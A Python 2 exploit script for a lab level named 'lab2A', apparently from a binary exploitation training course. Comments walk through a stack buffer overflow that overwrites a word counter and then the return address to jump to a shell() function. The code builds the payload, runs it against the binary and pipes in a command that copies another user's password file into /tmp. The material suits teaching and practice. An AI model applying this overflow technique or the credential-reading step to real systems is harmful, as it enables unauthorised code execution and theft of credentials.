#!/usr/bin/python
# coding: utf-8


'''
Exploit for level lab2A
'''


import os
import struct


#   Behaviour: This level asks the user to input 10 words and then conca-
# tenates the first character of each word in a buffer at [ebp-0x14].
# Finally, the program prints that buffer.

#   Observations: The way that the program checks how many words the user
# has typed in is by incrementing a counter (stored in [ebp-0x1c]) until
# it is equal to 0xa. The buffer where the typed words are temporally
# stored is in [ebp-0x28] and fgets can read up to 15 characters; this
# means that the word counter can be overwriten by an overflow. The
# program doesn't check whether the counter is bigger than 0xa, this means
# that if we skip the value 0xa the program will continue to ask for more
# words until it overflows and gets back to 0xa.

#   Exploitation: The way we are going to exploit the buffer overflow bug is
# by carefully crafting the words to change the word counter in a way that lets
# us type as many words as we need. Then we will be able to overwrite stack
# values by concatenating the first byte of each word.

# Note that with the ability to overwrite stack values we can change the return
# address and redirect the flow of the program wherever we want to. Our target
# here is going to be the shell() function at 0x080486fd

# Time to write the exploit!

# First, we need to know how many words we have to write in order to reach the
# return address (since we can only write a byte per word: 0x18 bytes to reach
# the return address from [ebp-0x14] gives us 24 words + 4 words to overwrite
# the address (28 in total).

# Our first word will have to overwrite the word counter. We can't control the
# last byte since fgets only allow us to write up to 15 characters (but it will
# fill it with the NULL character). This means that if our word ends with
# "\xff\xff\xff" fgets will place the NULL at the end and the word counter will
# look like this 0xffffff00 (which means that we can write up to 255 words if
# we want to).

# We only need 32 words to acomplish our objective so we can feed the program
# with a 33rd word which will be a 0xa to cause the program to stop reading.


def prepare(buf):
    '''
    This function will take a buffer we want to write into the stack
    and prepare it as a list of one-byte words.
    '''
    return '\\n'.join(x for x in buf) + '\\n'


first_word = "\xff"*15  # First word will overwrite the word counter
pad = "\x41"*23         # 23 bytes of padding
ret_addr = struct.pack('<I', 0x080486fd)  # The new return address

# This will be our crafted buffer of words
crafted = first_word + prepare(pad) + prepare(ret_addr)

cmd = 'python -c \'print "%s"\'' % crafted
os.system('(%s; echo "cat /home/lab2end/.pass > /tmp/lab2end.pass") |' % cmd +
          ' /levels/lab02/lab2A')
print '[+] Password saved in /tmp/lab2end.pass'
